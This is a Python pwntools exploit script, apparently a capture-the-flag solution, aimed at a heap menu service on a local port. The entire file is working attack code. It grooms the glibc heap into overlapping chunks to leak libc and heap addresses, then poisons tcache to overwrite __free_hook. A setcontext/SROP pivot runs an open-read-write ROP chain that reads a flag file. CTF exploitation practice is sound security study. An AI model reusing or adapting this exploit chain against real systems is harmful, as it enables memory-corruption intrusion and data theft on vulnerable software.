#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal



# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = '/root/input_elf'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('127.0.0.1', 10005)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/root/libc.so')


def add(size, content):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter(': ', str(size))
    sh.sendafter(': ', content)

def delete(index):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter(': ', str(index))

def show(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter(': ', str(index))

add(0x418, '\n')
add(0x58, '\n')
add(0x178, '\n')
add(0x158, '\n')
add(0x18, '\n')
for i in range(12):
    add(0x18, '\n')
for i in range(7 + 3):
    add(0x38, '\n')
for i in range(7 + 4):
    add(0x68, '\n')


for i in range(7): # 38
    add(0x28, '\n')

add(0x868, '\n') # 45
add(0x5e0, '\n')
add(0x18, '\n')
delete(46)
add(0x618, '\n')
add(0x28, 'a' * 8 + p64(0xe1) + p8(0x90)) # 48
add(0x28, '\n')
add(0x28, '\n')
add(0x28, '\n')
add(0x28, '\n')
for i in range(7):
    delete(i + 38)

delete(49)
delete(51)

for i in range(7):
    add(0x28, '\n')

add(0x618, '\n')
add(0x28, 'b' * 8 + p8(0x10))
add(0x28, '\x03')

for i in range(7):
    delete(i + 38)

delete(52)
delete(48)

for i in range(7):
    add(0x28, '\n')

add(0x28, p8(0x10))
add(0x28, 'c' * 0x20 + p64(0xe0))

add(0x4f8, '\n')
delete(54)

context.log_level = 'debug'

add(0x18, '\n')
show(53)
result = sh.recvuntil('\n', drop=True)
libc_addr = u64(result.ljust(8, '\0')) - 0x1e4ca0
log.success('libc_addr: ' + hex(libc_addr))

add(0x38, '\n')
delete(17) # size: 0x38
delete(55)
show(53)
result = sh.recvuntil('\n', drop=True)
heap_addr = u64(result.ljust(8, '\0')) - 0x1270
log.success('heap_addr: ' + hex(heap_addr))

add(0x18, '\n')
delete(17)
delete(50)
add(0x28, p64(0) + p64(0x31)  + p64(libc_addr + libc.symbols['__free_hook']))
add(0x18, '\n')

# 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 
add(0x18, p64(libc_addr + 0x000000000012be97))


frame = SigreturnFrame()
frame.rdi = heap_addr + 0x30a0 + 0x100 + 0x100
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = heap_addr + 0x30a0 + 0x100
frame.rip = libc_addr + 0x000000000002535f # : ret
frame.set_regvalue('&fpstate', heap_addr)

str_frame = str(frame)
payload = p64(libc_addr + libc.symbols['setcontext'] + 0x1d) + p64(heap_addr + 0x30a0) + str_frame[0x10:]

layout = [
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    2,
    # sys_open("./flag", 0)
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    3, # maybe it is 2
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr + 0x10000,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    0,
    # sys_read(flag_fd, heap, 0x100)
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    1,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr + 0x10000,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    1,
    # sys_write(1, heap, 0x100)
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    0,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    231,
    # exit(0)
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
]
payload = payload.ljust(0x100, '\0') + flat(layout)
payload = payload.ljust(0x200, '\0') + './flag'
add(0x300, payload)
delete(56)


sleep(1)
sh.sendline("id")
sleep(1)
print sh.recv(timeout=5)
sleep(10)
sh.close
#sh.interactive()
